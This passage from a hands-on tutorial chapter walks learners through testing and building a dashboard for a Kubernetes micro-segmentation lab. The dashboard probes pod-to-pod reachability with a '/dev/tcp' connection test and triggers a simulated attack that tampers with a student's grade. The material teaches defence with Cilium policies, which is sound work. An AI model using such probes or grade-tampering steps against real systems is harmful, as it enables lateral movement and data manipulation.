+<p>The dashboard answered with an error page instead of JSON, because the route's Python code crashed. Look at the dashboard's terminal. A traceback is the block Python prints when it crashes, starting with <code>Traceback (most recent call last):</code>, and its last line names the error. <code>FileNotFoundError: [Errno 2] No such file or directory: 'kubectl'</code> means the program can't find kubectl. Click into the dashboard's terminal and press Ctrl+C to stop it, then run <code class="nw">which kubectl</code> there. If it prints nothing, go back to the kubectl install in <a href="ch03.html">chapter 3</a>. If it prints a path, start the dashboard again with the step 3 command from that same terminal, and repeat the curl.</p>
+<h2 id="step-5-run-one-probe-by-hand">Step 5. Run one probe by hand</h2>
+<p>Each probe has to start inside the source pod, because Cilium checks a connection at the network interface of the pod it leaves from, as Figure 6 shows. <code class="nw">kubectl exec</code> is how you run a command there.</p>
+<figure class="fig"><a href="../files/figures/fig06-en.png"><img src="../files/figures/web/fig06-en.png" alt="How Cilium decides" width="1600" height="900" loading="lazy" decoding="async"></a><figcaption>How Cilium decides</figcaption></figure>
+<p>In Figure 6, notice that the check sits on each pod's own network interface, so a connection is judged by the pod it leaves from and the pod it arrives at.</p>
+<p>Run one probe by hand to see what <code class="nw">probe_from</code> does for a single cell, news to db.</p>
+<figure class="code cmd"><figcaption><span class="lbl">Ubuntu terminal</span><button type="button" class="copy" aria-label="Copy this command">Copy</button></figcaption><pre dir="ltr"><code>kubectl -n campus exec deploy/news -- bash -c &quot;timeout 2 bash -c &#x27;echo &gt; /dev/tcp/db/5432&#x27;&quot;; echo &quot;exit code $?&quot;</code></pre></figure>
+<p><code>kubectl -n campus exec deploy/news --</code> runs the rest inside a news pod. <code class="nw">bash -c "..."</code> hands the text in double quotes to bash inside the pod, which tries the connection with a 2-second limit. kubectl passes the exit code of that command back to WSL, and <code class="nw">echo "exit code $?"</code> prints it.</p>
+<p><strong>You should see</strong> one line.</p>
+<p><code class="nw">exit code 0</code> means news opened a TCP connection to the database's port, the first thing the attacker needs in <a href="ch08.html">chapter 8</a>. After <a href="ch10.html">chapter 10</a> the same command takes 2 seconds, prints <code>command terminated with exit code 124</code> and then <code class="nw">exit code 124</code>, because Cilium drops the connection before it reaches db.</p>
+<p class="ifnot"><strong>If you see this instead</strong></p>
+<figure class="code out bad"><figcaption><span class="lbl">Output when something is wrong</span></figcaption><pre dir="ltr"><code>error: unable to upgrade connection: container not found (&quot;news&quot;)</code></pre></figure>
+<p>The news pod is being replaced at this moment. Wait until <code class="nw">kubectl -n campus get pods</code> shows it <code class="nw">1/1 Running</code>, then run the probe again.</p>
+<p><code class="nw">exit code 1</code> comes back without the 2-second wait. Something answered "no" at once, which happens when the db pod isn't ready and its Service has nowhere to send the connection. Check the db pod with <code class="nw">kubectl -n campus get pods</code>.</p>
+<h2 id="step-6-test-the-matrix-route">Step 6. Test the matrix route</h2>
+<p>This is the route the checkpoint depends on. It runs the probe from step 5 for all 36 paths.</p>
+<figure class="code cmd"><figcaption><span class="lbl">Ubuntu terminal</span><button type="button" class="copy" aria-label="Copy this command">Copy</button></figcaption><pre dir="ltr"><code>time curl -s localhost:5050/api/matrix | jq -c &#x27;{open, total}&#x27;</code></pre></figure>
+<p><code class="nw">time</code> in front of a command measures how long it took. <code class="nw">jq -c '{open, total}'</code> keeps the two counts and prints them on one line, since <code class="nw">-c</code> means compact.</p>
+<p><strong>You should see</strong> the two counts, then the timing.</p>
+<figure class="code out"><figcaption><span class="lbl">Output</span></figcaption><pre dir="ltr"><code>{&quot;open&quot;:36,&quot;total&quot;:36}
+
+real	0m1.191s
+user	0m0.004s
+sys	0m0.009s</code></pre></figure>
+<p>The first line must read <code class="nw">{"open":36,"total":36}</code>, every path reachable, which is what a flat network means. The <code class="nw">real</code> line is the time you waited, about 1.2 seconds on the test laptop, and yours will differ a little. Ignore the <code class="nw">user</code> and <code class="nw">sys</code> lines. The comment in <code class="nw">app.py</code> gives a rough figure of about 3 seconds, which is the upper end you can expect.</p>
+<p>Now look at the cells themselves.</p>
+<figure class="code cmd"><figcaption><span class="lbl">Ubuntu terminal</span><button type="button" class="copy" aria-label="Copy this command">Copy</button></figcaption><pre dir="ltr"><code>curl -s localhost:5050/api/matrix | jq -c &#x27;.matrix&#x27;</code></pre></figure>
+<p><code class="nw">.matrix</code> picks the table of cells. With <code class="nw">-c</code> it comes out as one long line.</p>
+<p>You should see one group per source pod.</p>
+<figure class="code out"><figcaption><span class="lbl">Output</span></figcaption><pre dir="ltr"><code>{&quot;admin&quot;:{&quot;api&quot;:&quot;open&quot;,&quot;auth&quot;:&quot;open&quot;,&quot;db&quot;:&quot;open&quot;,&quot;frontend&quot;:&quot;open&quot;,&quot;news&quot;:&quot;open&quot;},&quot;api&quot;:{&quot;admin&quot;:&quot;open&quot;,&quot;auth&quot;:&quot;open&quot;,&quot;db&quot;:&quot;open&quot;,&quot;frontend&quot;:&quot;open&quot;,&quot;news&quot;:&quot;open&quot;},&quot;auth&quot;:{&quot;admin&quot;:&quot;open&quot;,&quot;api&quot;:&quot;open&quot;,&quot;db&quot;:&quot;open&quot;,&quot;frontend&quot;:&quot;open&quot;,&quot;news&quot;:&quot;open&quot;},&quot;db&quot;:{&quot;admin&quot;:&quot;open&quot;,&quot;api&quot;:&quot;open&quot;,&quot;auth&quot;:&quot;open&quot;,&quot;frontend&quot;:&quot;open&quot;,&quot;news&quot;:&quot;open&quot;},&quot;frontend&quot;:{&quot;admin&quot;:&quot;open&quot;,&quot;api&quot;:&quot;open&quot;,&quot;auth&quot;:&quot;open&quot;,&quot;db&quot;:&quot;open&quot;,&quot;news&quot;:&quot;open&quot;},&quot;news&quot;:{&quot;admin&quot;:&quot;open&quot;,&quot;api&quot;:&quot;open&quot;,&quot;auth&quot;:&quot;open&quot;,&quot;db&quot;:&quot;open&quot;,&quot;frontend&quot;:&quot;open&quot;},&quot;ops&quot;:{&quot;admin&quot;:&quot;open&quot;,&quot;api&quot;:&quot;open&quot;,&quot;auth&quot;:&quot;open&quot;,&quot;db&quot;:&quot;open&quot;,&quot;frontend&quot;:&quot;open&quot;,&quot;news&quot;:&quot;open&quot;}}</code></pre></figure>
+<p>Flask sorts the names alphabetically, so the groups come in the order admin, api, auth, db, frontend, news, ops. Every value is <code class="nw">"open"</code>. Each group has five targets because a source isn't probed against itself. Ops has six, since it isn't a target and so skips nothing. Six groups of five plus the six of ops make 36.</p>
+<p class="ifnot"><strong>If you see this instead</strong></p>
+<p><code class="nw">{"open":0,"total":0}</code>. Every probe failed before it could start, so no line came back from any pod. Run the probe from step 5 by hand, which shows the error kubectl gives. The two you're most likely to meet are these.</p>
+<figure class="code out"><figcaption><span class="lbl">Output</span></figcaption><pre dir="ltr"><code>The connection to the server 127.0.0.1:37645 was refused - did you specify the right host or port?</code></pre></figure>
+<p>The cluster is stopped, usually after Windows restarted, and the port number on your screen will differ. Start the nodes as in <a href="ch06.html">chapter 6</a> step 1.</p>
+<figure class="code out"><figcaption><span class="lbl">Output</span></figcaption><pre dir="ltr"><code>Error from server (NotFound): deployments.apps &quot;news&quot; not found</code></pre></figure>
+<p>The portal isn't deployed, or the <code class="nw">campus</code> namespace is gone. Run <code class="nw">bash ~/microseg/deploy.sh</code>. After either fix, repeat the matrix request.</p>
+<p><code class="nw">total</code> is lower than 36, for example <code class="nw">{"open":30,"total":30}</code> when the ops pod is missing. A source pod that doesn't answer leaves its whole row out of the count. Look for a pod that isn't <code class="nw">1/1 Running</code> with <code class="nw">kubectl -n campus get pods</code>.</p>
+<p><code class="nw">open</code> is lower than <code class="nw">total</code>. Some cells say <code class="nw">blocked</code> or <code class="nw">refused</code>. <code class="nw">blocked</code> on a network you think is flat means policies are still loaded, and <code>kubectl -n campus get ciliumnetworkpolicies</code> must print <code>No resources found in campus namespace.</code> with nothing else. If it lists anything, run <code class="nw">bash ~/microseg/deploy.sh</code> for a clean start. <code class="nw">refused</code> means the target pod isn't ready, so check it with <code class="nw">kubectl -n campus get pods</code>.</p>
+<h2 id="step-7-test-the-policy-and-drops-routes">Step 7. Test the policy and drops routes</h2>
+<p>The policy route needs files you write in <a href="ch10.html">chapter 10</a>, but you can already check that it runs kubectl and passes the answer back.</p>
+<figure class="code cmd"><figcaption><span class="lbl">Ubuntu terminal</span><button type="button" class="copy" aria-label="Copy this command">Copy</button></figcaption><pre dir="ltr"><code>curl -s -X POST localhost:5050/api/policies/remove | jq -r .output</code></pre></figure>
+<p><code class="nw">-X POST</code> sends a POST request instead of a GET. <code class="nw">remove</code> lands in the <code class="nw">else</code> branch of the route, which runs <code class="nw">kubectl delete</code> on the policy folder. <code class="nw">jq -r .output</code> prints what kubectl said.</p>
+<p><strong>You should see</strong> an error from kubectl.</p>
+<p>The line starts with <code class="nw">error:</code> and says the folder <code class="nw">k8s/policies</code> doesn't exist. Your Linux user name appears in the path. That error is the expected result here, since the folder appears in <a href="ch10.html">chapter 10</a>. It proves the route reached kubectl and brought its message back.</p>
+<p>The drops route reads from Hubble through the tunnel you started in <a href="ch04.html">chapter 4</a>, so check that the tunnel is still running before you test the route.</p>
+<figure class="code cmd"><figcaption><span class="lbl">Ubuntu terminal</span><button type="button" class="copy" aria-label="Copy this command">Copy</button></figcaption><pre dir="ltr"><code>hubble status</code></pre></figure>
+<p><code class="nw">hubble status</code> asks Hubble Relay, through the tunnel on port 4245 of your laptop, how it's doing and how many nodes it hears from.</p>
+<p><strong>You should see</strong> a few lines about Hubble.</p>
+<p>The line that must match is <code class="nw">Connected Nodes: 3/3</code>, one for each node of your cluster. The flow numbers differ on every run.</p>
+<p>If you get an error line that contains the text below, the tunnel isn't running, which is normal after Windows or Ubuntu restarts. The rest of that line differs between Hubble versions.</p>
+<figure class="code out"><figcaption><span class="lbl">Output</span></figcaption><pre dir="ltr"><code>failed to connect to &#x27;localhost:4245&#x27;</code></pre></figure>
+<p>Start the tunnel with <code>cilium hubble port-forward &amp;</code>, wait five seconds and run <code class="nw">hubble status</code> again. The <code class="nw">&amp;</code> runs the tunnel in the background of this terminal, so it keeps going while the terminal stays open. Like the dashboard, it needs starting again after every restart.</p>
+<p>Now the drops route.</p>
+<figure class="code cmd"><figcaption><span class="lbl">Ubuntu terminal</span><button type="button" class="copy" aria-label="Copy this command">Copy</button></figcaption><pre dir="ltr"><code>curl -s localhost:5050/api/drops | jq</code></pre></figure>
+<p><code class="nw">jq</code> with no filter prints the whole answer, indented.</p>
+<p><strong>You should see</strong> an object with one field, <code class="nw">output</code>.</p>
+<p>On a flat network no policy has dropped anything, so <code class="nw">output</code> is usually an empty string, <code class="nw">""</code>. If it holds lines, each one is a flow record from Hubble with a date at the start, and none of them says <code class="nw">Policy denied</code>. In <a href="ch10.html">chapter 10</a> this same route fills up with drops from news.</p>
+<p class="ifnot"><strong>If you see this instead</strong></p>
+<p><code class="nw">output</code> holds an error that mentions <code class="nw">localhost:4245</code> instead of flow records. The tunnel to Hubble stopped after your <code class="nw">hubble status</code> check, usually because the terminal it ran in was closed. Start it again with <code>cilium hubble port-forward &amp;</code> in a terminal you keep open, then repeat the request.</p>
+<p><code class="nw">hubble status</code> keeps failing even with the tunnel started. Run <code class="nw">cilium status</code> and look at the line for Hubble Relay, which must say <code class="nw">OK</code>. If it doesn't, Hubble itself isn't running, and the Hubble part of <a href="ch04.html">chapter 4</a> shows how to get it back.</p>
+<p>The attack route is the one you don't test in this chapter. It changes Omar's grade in the database, and <a href="ch08.html">chapter 8</a> starts by looking at that grade before the attack. If you ever run it by accident, put the database back with <code>kubectl -n campus rollout restart deployment/db</code>. That replaces the db pod, and since its data isn't kept anywhere, Omar's grade is 58 again.</p>
+<p>This is the end of the first sitting. If you stop here, press Ctrl+C in the dashboard's terminal.</p>
+<p>When you come back, probably after Windows has restarted, bring back all three pieces before step 8. Run <code class="nw">kubectl get nodes -L tier</code> and, if it fails, fix it as in <a href="ch06.html">chapter 6</a> step 1. Start the dashboard in one terminal with the step 3 command. In a second terminal run <code>cilium hubble port-forward &amp;</code>, wait five seconds and run <code class="nw">hubble status</code>, which must show <code class="nw">Connected Nodes: 3/3</code> as above.</p>
+<h2 id="step-8-write-dashboardindexhtml">Step 8. Write dashboard/index.html</h2>
+<p>The page turns the JSON from the routes into a drawing that changes color and a table, with buttons for the actions. It's plain HTML with a little JavaScript, the language browsers run, and it needs no build step.</p>
+<p>Open a new file in VS Code.</p>
+<figure class="code cmd"><figcaption><span class="lbl">Ubuntu terminal</span><button type="button" class="copy" aria-label="Copy this command">Copy</button></figcaption><pre dir="ltr"><code>code ~/microseg/dashboard/index.html</code></pre></figure>
+<p><strong>You should see</strong> VS Code open an empty tab named <code class="nw">index.html</code>. Paste the file below and save it.</p>
+<figure class="code file"><figcaption><span class="lbl">File: dashboard/index.html</span><button type="button" class="copy" aria-label="Copy this file">Copy</button></figcaption><pre dir="ltr"><code>&lt;!doctype html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;title&gt;Micro-segmentation dashboard&lt;/title&gt;
+&lt;style&gt;
+  body { font-family: &quot;Segoe UI&quot;, Arial, sans-serif; margin: 24px; max-width: 1000px; color: #13233F; }
+  section { margin-bottom: 28px; }
+  table { border-collapse: collapse; }
+  th, td { border: 1px solid #D5DAE2; padding: 4px 10px; text-align: center; }
+  .open { background: #E1EEF7; color: #0B4F7A; }
+  .blocked { background: #FBE7D9; color: #8A3B00; }
+  .refused { background: #F3F0D6; }
+  pre { background: #F4F6F9; padding: 8px; max-height: 320px; overflow: auto; white-space: pre-wrap; }
+  svg text { font-size: 13px; }
+&lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h1&gt;Campus Portal: micro-segmentation dashboard&lt;/h1&gt;
+
+&lt;section&gt;
+  &lt;h2&gt;Policies: &lt;span id=&quot;policy-status&quot;&gt;loading...&lt;/span&gt;&lt;/h2&gt;
+  &lt;button onclick=&quot;setPolicies(&#x27;apply&#x27;)&quot;&gt;Apply policies&lt;/button&gt;
+  &lt;button onclick=&quot;setPolicies(&#x27;remove&#x27;)&quot;&gt;Remove policies&lt;/button&gt;
+  &lt;pre id=&quot;policy-output&quot;&gt;&lt;/pre&gt;
+&lt;/section&gt;
+
+&lt;section&gt;
+  &lt;h2&gt;Topology&lt;/h2&gt;
+  &lt;svg width=&quot;760&quot; height=&quot;320&quot;&gt;
+    &lt;rect x=&quot;150&quot; y=&quot;30&quot; width=&quot;170&quot; height=&quot;275&quot; fill=&quot;#F4F6F9&quot; stroke=&quot;#56627A&quot;/&gt;
+    &lt;text x=&quot;158&quot; y=&quot;50&quot;&gt;kind-worker&lt;/text&gt;
+    &lt;text x=&quot;158&quot; y=&quot;66&quot;&gt;tier=frontend&lt;/text&gt;
+    &lt;rect x=&quot;360&quot; y=&quot;30&quot; width=&quot;370&quot; height=&quot;275&quot; fill=&quot;#F4F6F9&quot; stroke=&quot;#56627A&quot;/&gt;
+    &lt;text x=&quot;368&quot; y=&quot;50&quot;&gt;kind-worker2&lt;/text&gt;
+    &lt;text x=&quot;368&quot; y=&quot;66&quot;&gt;tier=backend&lt;/text&gt;
+
+    &lt;line x1=&quot;60&quot; y1=&quot;160&quot; x2=&quot;235&quot; y2=&quot;100&quot; stroke=&quot;#56627A&quot; stroke-width=&quot;3&quot;/&gt;
+    &lt;line data-src=&quot;frontend&quot; data-dst=&quot;api&quot; x1=&quot;235&quot; y1=&quot;100&quot; x2=&quot;440&quot; y2=&quot;90&quot; stroke=&quot;#56627A&quot; stroke-width=&quot;3&quot;/&gt;
+    &lt;line data-src=&quot;frontend&quot; data-dst=&quot;news&quot; x1=&quot;235&quot; y1=&quot;100&quot; x2=&quot;235&quot; y2=&quot;230&quot; stroke=&quot;#56627A&quot; stroke-width=&quot;3&quot;/&gt;
+    &lt;line data-src=&quot;api&quot; data-dst=&quot;auth&quot; x1=&quot;440&quot; y1=&quot;90&quot; x2=&quot;440&quot; y2=&quot;180&quot; stroke=&quot;#56627A&quot; stroke-width=&quot;3&quot;/&gt;
+    &lt;line data-src=&quot;api&quot; data-dst=&quot;db&quot; x1=&quot;440&quot; y1=&quot;90&quot; x2=&quot;640&quot; y2=&quot;130&quot; stroke=&quot;#56627A&quot; stroke-width=&quot;3&quot;/&gt;
+    &lt;line data-src=&quot;auth&quot; data-dst=&quot;db&quot; x1=&quot;440&quot; y1=&quot;180&quot; x2=&quot;640&quot; y2=&quot;130&quot; stroke=&quot;#56627A&quot; stroke-width=&quot;3&quot;/&gt;
+    &lt;line data-src=&quot;admin&quot; data-dst=&quot;db&quot; x1=&quot;640&quot; y1=&quot;240&quot; x2=&quot;640&quot; y2=&quot;130&quot; stroke=&quot;#56627A&quot; stroke-width=&quot;3&quot;/&gt;
+    &lt;line data-src=&quot;ops&quot; data-dst=&quot;admin&quot; x1=&quot;440&quot; y1=&quot;280&quot; x2=&quot;640&quot; y2=&quot;240&quot; stroke=&quot;#56627A&quot; stroke-width=&quot;3&quot;/&gt;
+    &lt;line data-src=&quot;news&quot; data-dst=&quot;api&quot; x1=&quot;235&quot; y1=&quot;230&quot; x2=&quot;440&quot; y2=&quot;90&quot; stroke=&quot;#56627A&quot; stroke-width=&quot;2&quot; stroke-dasharray=&quot;6&quot;/&gt;
+    &lt;path data-src=&quot;news&quot; data-dst=&quot;db&quot; d=&quot;M 275 236 Q 560 250 618 144&quot; fill=&quot;none&quot; stroke=&quot;#56627A&quot; stroke-width=&quot;2&quot; stroke-dasharray=&quot;6&quot;/&gt;
+    &lt;line data-src=&quot;news&quot; data-dst=&quot;admin&quot; x1=&quot;235&quot; y1=&quot;230&quot; x2=&quot;640&quot; y2=&quot;240&quot; stroke=&quot;#56627A&quot; stroke-width=&quot;2&quot; stroke-dasharray=&quot;6&quot;/&gt;
+
+    &lt;rect x=&quot;15&quot; y=&quot;146&quot; width=&quot;90&quot; height=&quot;28&quot; fill=&quot;white&quot; stroke=&quot;#13233F&quot;/&gt;&lt;text x=&quot;60&quot; y=&quot;165&quot; text-anchor=&quot;middle&quot;&gt;Windows&lt;/text&gt;
+    &lt;rect x=&quot;195&quot; y=&quot;86&quot; width=&quot;80&quot; height=&quot;28&quot; fill=&quot;white&quot; stroke=&quot;#13233F&quot;/&gt;&lt;text x=&quot;235&quot; y=&quot;105&quot; text-anchor=&quot;middle&quot;&gt;frontend&lt;/text&gt;
+    &lt;rect x=&quot;195&quot; y=&quot;216&quot; width=&quot;80&quot; height=&quot;28&quot; fill=&quot;white&quot; stroke=&quot;#13233F&quot;/&gt;&lt;text x=&quot;235&quot; y=&quot;235&quot; text-anchor=&quot;middle&quot;&gt;news&lt;/text&gt;
+    &lt;rect x=&quot;400&quot; y=&quot;76&quot; width=&quot;80&quot; height=&quot;28&quot; fill=&quot;white&quot; stroke=&quot;#13233F&quot;/&gt;&lt;text x=&quot;440&quot; y=&quot;95&quot; text-anchor=&quot;middle&quot;&gt;api&lt;/text&gt;
+    &lt;rect x=&quot;400&quot; y=&quot;166&quot; width=&quot;80&quot; height=&quot;28&quot; fill=&quot;white&quot; stroke=&quot;#13233F&quot;/&gt;&lt;text x=&quot;440&quot; y=&quot;185&quot; text-anchor=&quot;middle&quot;&gt;auth&lt;/text&gt;
+    &lt;rect x=&quot;400&quot; y=&quot;266&quot; width=&quot;80&quot; height=&quot;28&quot; fill=&quot;white&quot; stroke=&quot;#13233F&quot;/&gt;&lt;text x=&quot;440&quot; y=&quot;285&quot; text-anchor=&quot;middle&quot;&gt;ops&lt;/text&gt;
+    &lt;rect x=&quot;600&quot; y=&quot;116&quot; width=&quot;80&quot; height=&quot;28&quot; fill=&quot;white&quot; stroke=&quot;#13233F&quot;/&gt;&lt;text x=&quot;640&quot; y=&quot;135&quot; text-anchor=&quot;middle&quot;&gt;db&lt;/text&gt;
+    &lt;rect x=&quot;600&quot; y=&quot;226&quot; width=&quot;80&quot; height=&quot;28&quot; fill=&quot;white&quot; stroke=&quot;#13233F&quot;/&gt;&lt;text x=&quot;640&quot; y=&quot;245&quot; text-anchor=&quot;middle&quot;&gt;admin&lt;/text&gt;
+  &lt;/svg&gt;
+  &lt;p&gt;Solid lines are the paths the portal needs. Dashed lines are attacker paths from news. Blue means reachable, orange means blocked.&lt;/p&gt;
+  &lt;pre id=&quot;pods&quot;&gt;&lt;/pre&gt;
+&lt;/section&gt;
+
+&lt;section&gt;
+  &lt;h2&gt;Reachability matrix &lt;button onclick=&quot;loadMatrix()&quot;&gt;Refresh&lt;/button&gt;&lt;/h2&gt;
+  &lt;p id=&quot;matrix-summary&quot;&gt;&lt;/p&gt;
+  &lt;table id=&quot;matrix&quot;&gt;&lt;/table&gt;
+&lt;/section&gt;
+
+&lt;section&gt;
+  &lt;h2&gt;Attack from the news pod &lt;button onclick=&quot;runAttack()&quot;&gt;Run attack&lt;/button&gt;&lt;/h2&gt;
+  &lt;p id=&quot;attack-summary&quot;&gt;&lt;/p&gt;
+  &lt;pre id=&quot;attack-log&quot;&gt;&lt;/pre&gt;
+&lt;/section&gt;
+
+&lt;section&gt;
+  &lt;h2&gt;Recent Hubble drops &lt;button onclick=&quot;loadDrops()&quot;&gt;Refresh&lt;/button&gt;&lt;/h2&gt;
+  &lt;pre id=&quot;drops&quot;&gt;&lt;/pre&gt;
+&lt;/section&gt;
+
+&lt;script&gt;
+async function getJSON(url, options) {
+  const answer = await fetch(url, options);
+  return answer.json();
+}
+
+async function loadStatus() {
+  const data = await getJSON(&quot;/api/status&quot;);
+  let text = &quot;OFF&quot;;
+  if (data.policies.length &gt; 0) {
+    text = &quot;ON (&quot; + data.policies.length + &quot; policies)&quot;;
+  }
+  document.getElementById(&quot;policy-status&quot;).textContent = text;
+  document.getElementById(&quot;pods&quot;).textContent = data.pods;
+}
+
+async function setPolicies(action) {
+  document.getElementById(&quot;policy-output&quot;).textContent = &quot;Working...&quot;;
+  const data = await getJSON(&quot;/api/policies/&quot; + action, {method: &quot;POST&quot;});
+  document.getElementById(&quot;policy-output&quot;).textContent = data.output;
+  await loadStatus();
+  setTimeout(loadMatrix, 5000);   // give Cilium a few seconds to update every pod
+}
+
+async function loadMatrix() {
+  document.getElementById(&quot;matrix-summary&quot;).textContent = &quot;Probing (a few seconds)...&quot;;
+  const data = await getJSON(&quot;/api/matrix&quot;);
+  let html = &quot;&lt;tr&gt;&lt;th&gt;from \\ to&lt;/th&gt;&quot;;
+  for (const target of data.targets) {
+    html += &quot;&lt;th&gt;&quot; + target + &quot;&lt;/th&gt;&quot;;
+  }
+  html += &quot;&lt;/tr&gt;&quot;;
+  for (const source of data.sources) {
+    html += &quot;&lt;tr&gt;&lt;th&gt;&quot; + source + &quot;&lt;/th&gt;&quot;;
+    for (const target of data.targets) {
+      const state = data.matrix[source][target] || &quot;self&quot;;
+      html += &#x27;&lt;td class=&quot;&#x27; + state + &#x27;&quot;&gt;&#x27; + state + &quot;&lt;/td&gt;&quot;;
+    }
+    html += &quot;&lt;/tr&gt;&quot;;
+  }
+  document.getElementById(&quot;matrix&quot;).innerHTML = html;
+  document.getElementById(&quot;matrix-summary&quot;).textContent = data.open + &quot; of &quot; + data.total + &quot; paths reachable&quot;;
+  for (const line of document.querySelectorAll(&quot;[data-src]&quot;)) {
+    const state = data.matrix[line.dataset.src][line.dataset.dst];
+    line.style.stroke = (state === &quot;open&quot;) ? &quot;#0072B2&quot; : &quot;#D55E00&quot;;
+  }
+}
+
+async function runAttack() {
+  document.getElementById(&quot;attack-summary&quot;).textContent = &quot;Running 5 steps (up to 30 seconds)...&quot;;
+  const steps = await getJSON(&quot;/api/attack&quot;, {method: &quot;POST&quot;});
+  let log = &quot;&quot;;
+  let succeeded = 0;
+  for (const step of steps) {
+    if (step.success) {
+      succeeded += 1;
+    }
+    log += (step.success ? &quot;[SUCCESS] &quot; : &quot;[FAILED]  &quot;) + step.step + &quot;\n&quot; + step.output + &quot;\n\n&quot;;
+  }
+  document.getElementById(&quot;attack-summary&quot;).textContent = succeeded + &quot; of &quot; + steps.length + &quot; attack steps succeeded&quot;;
+  document.getElementById(&quot;attack-log&quot;).textContent = log;
+}
+
+async function loadDrops() {
+  document.getElementById(&quot;drops&quot;).textContent = &quot;Loading...&quot;;
+  const data = await getJSON(&quot;/api/drops&quot;);
+  document.getElementById(&quot;drops&quot;).textContent = data.output || &quot;(no drops)&quot;;
+}
+
+loadStatus();
+loadMatrix();
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre></figure>
+<p>(1) The <code class="nw">&lt;style&gt;</code> block sets the colors. Open cells are blue, blocked cells are orange and refused cells are pale yellow.</p>
+<p>(2) The first <code class="nw">&lt;section&gt;</code> shows the policy state in its heading and has the <strong>Apply policies</strong> and <strong>Remove policies</strong> buttons. Each button calls <code class="nw">setPolicies</code> with <code class="nw">apply</code> or <code class="nw">remove</code>, which posts to the route you tested in step 7.</p>
+<p>(3) The topology is an SVG, a drawing written as text. It has two light grey frames for the worker nodes, each labelled with the node's name and its tier, and white boxes for the services, placed on the node where each one runs. Every line that stands for a path carries <code class="nw">data-src</code> and <code class="nw">data-dst</code>, the source and target it belongs to. Here are the three attacker paths.</p>
+<figure class="code file excerpt"><figcaption><span class="lbl">From dashboard/index.html</span></figcaption><pre dir="ltr"><code>    &lt;line data-src=&quot;news&quot; data-dst=&quot;api&quot; x1=&quot;235&quot; y1=&quot;230&quot; x2=&quot;440&quot; y2=&quot;90&quot; stroke=&quot;#56627A&quot; stroke-width=&quot;2&quot; stroke-dasharray=&quot;6&quot;/&gt;
+    &lt;path data-src=&quot;news&quot; data-dst=&quot;db&quot; d=&quot;M 275 236 Q 560 250 618 144&quot; fill=&quot;none&quot; stroke=&quot;#56627A&quot; stroke-width=&quot;2&quot; stroke-dasharray=&quot;6&quot;/&gt;
+    &lt;line data-src=&quot;news&quot; data-dst=&quot;admin&quot; x1=&quot;235&quot; y1=&quot;230&quot; x2=&quot;640&quot; y2=&quot;240&quot; stroke=&quot;#56627A&quot; stroke-width=&quot;2&quot; stroke-dasharray=&quot;6&quot;/&gt;</code></pre></figure>
+<p><code class="nw">stroke-dasharray</code> makes them dashed. The path from news to db is a <code class="nw">&lt;path&gt;</code>, a curve that bends under the auth box so it doesn't hide the line from auth to db. There are 8 solid lines, the 8 flows the portal needs. Seven of them run between pods and change color. The line from Windows to frontend has no <code class="nw">data-src</code>, so it always stays grey.</p>
+<p>(4) The matrix, attack and drops sections each have an empty element, a <code class="nw">&lt;table&gt;</code> or a <code class="nw">&lt;pre&gt;</code>, that the script fills in. A <code class="nw">&lt;pre&gt;</code> keeps the spaces and line breaks of command output.</p>
+<p>(5) The script starts with <code class="nw">getJSON</code>, a helper that sends a request with <code class="nw">fetch</code>, the browser's built-in way to call a route, and returns the JSON answer. <code class="nw">loadStatus</code> fills in the heading with <code class="nw">OFF</code> or <code class="nw">ON</code> and the number of policies, and prints the pod table.</p>
+<p>(6) <code class="nw">setPolicies</code> posts the action, shows kubectl's answer and refreshes the status. It then waits 5 seconds before it refreshes the matrix, because Cilium needs a few seconds to update every pod after a policy change.</p>
+<p>(7) <code class="nw">loadMatrix</code> is the longest function.</p>
+<figure class="code file excerpt"><figcaption><span class="lbl">From dashboard/index.html</span></figcaption><pre dir="ltr"><code>  for (const source of data.sources) {
+    html += &quot;&lt;tr&gt;&lt;th&gt;&quot; + source + &quot;&lt;/th&gt;&quot;;
+    for (const target of data.targets) {
+      const state = data.matrix[source][target] || &quot;self&quot;;
+      html += &#x27;&lt;td class=&quot;&#x27; + state + &#x27;&quot;&gt;&#x27; + state + &quot;&lt;/td&gt;&quot;;
+    }
+    html += &quot;&lt;/tr&gt;&quot;;
+  }
+  document.getElementById(&quot;matrix&quot;).innerHTML = html;
+  document.getElementById(&quot;matrix-summary&quot;).textContent = data.open + &quot; of &quot; + data.total + &quot; paths reachable&quot;;
+  for (const line of document.querySelectorAll(&quot;[data-src]&quot;)) {
+    const state = data.matrix[line.dataset.src][line.dataset.dst];
+    line.style.stroke = (state === &quot;open&quot;) ? &quot;#0072B2&quot; : &quot;#D55E00&quot;;
+  }</code></pre></figure>
+<p>For every source and target it writes one table cell whose class is the cell's state, so the colors from the <code class="nw">&lt;style&gt;</code> block apply. The pair a source would make with itself has no entry in the matrix, and <code class="nw">|| "self"</code> writes <code class="nw">self</code> there instead. The summary line becomes, for example, <code class="nw">36 of 36 paths reachable</code>. The last loop finds every element of the drawing that has a <code class="nw">data-src</code>, the curve included, and colors it blue when its path is open and orange when it isn't.</p>
+<p>(8) <code class="nw">runAttack</code> posts to the attack route and counts the steps that succeeded. It shows <code class="nw">[SUCCESS]</code> or <code class="nw">[FAILED]</code> next to each step, then the step's own output. <code class="nw">loadDrops</code> shows the drops or <code class="nw">(no drops)</code>.</p>
+<p>(9) Every piece of command output goes into the page through <code class="nw">textContent</code>, which shows it as plain text. With <code class="nw">innerHTML</code> the browser would read it as HTML, and the attack output is text an attacker controls. The matrix table uses <code class="nw">innerHTML</code> safely, because it's built only from your own fixed names and states.</p>
+<p>(10) The last two lines, <code class="nw">loadStatus()</code> and <code class="nw">loadMatrix()</code>, run once when the page opens, so the page shows the current state without a click.</p>
+<p>The dashboard reads <code class="nw">index.html</code> from disk on every request, so you don't need to restart it after saving this file.</p>
+<h2 id="step-9-open-the-dashboard">Step 9. Open the dashboard</h2>
+<p>Check first that the back end hands out the page.</p>
+<figure class="code cmd"><figcaption><span class="lbl">Ubuntu terminal</span><button type="button" class="copy" aria-label="Copy this command">Copy</button></figcaption><pre dir="ltr"><code>curl -s -o /dev/null -w &#x27;%{http_code}\n&#x27; localhost:5050/</code></pre></figure>
+<p><code class="nw">-o /dev/null</code> throws the page away and <code class="nw">-w '%{http_code}\n'</code> prints only the HTTP status code and a line break.</p>
+<p><strong>You should see</strong> one number.</p>
+<p>It must be <code class="nw">200</code>.</p>
